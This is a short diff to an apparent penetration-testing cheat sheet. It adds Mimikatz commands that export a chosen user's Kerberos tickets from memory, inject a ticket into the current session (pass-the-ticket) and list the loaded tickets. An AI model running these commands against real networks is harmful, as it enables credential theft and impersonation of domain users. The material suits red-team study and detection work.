@@ -27,3 +27,15 @@ Get all tickets stored in memory:
 ```cmd
 sekurlsa::tickets
 ```
+Dump a specific users ticket to a file:
+```cmd
+sekurlsa::tickets /export /filter:"<username>"
+```
+To use the ticket:
+```cmd
+kerberos::ptt you-ticket-file.kirbi
+```
+Check your tickets:
+```cmd
+kerberos::list
+```
